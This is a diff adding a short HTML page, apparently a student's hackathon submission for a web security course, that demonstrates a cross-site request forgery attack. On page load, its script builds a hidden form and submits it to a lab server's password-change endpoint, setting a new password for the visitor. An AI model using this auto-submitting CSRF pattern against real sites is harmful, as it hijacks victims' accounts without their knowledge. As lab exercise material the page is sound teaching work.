@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<title>WAPH-Hackathon 4 </title>
+<body>
+	<h1>WAPH Hackathon 4: Cross Site Request Forgery Attack</h1>
+	<h2> By Hacker Sruthi Sridhar Bopparthi</h2>
+	<script>
+		function CSRF()
+		{
+			var form = document.createElement('form');
+			form.action="https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php";
+			form.method='POST';
+			form.target='_self';
+			form.innerHTML="<input type='hidden' name='newpassword' value='bopparsrhacker'/>";
+			document.body.appendChild(form);
+			alert('CRSF attack for Hackathon-4 is about to happen by - Sruthi sridhar Bopparthi');
+			form.submit();
+		}
+		CSRF();
+	</script>
+</body>
+</html>
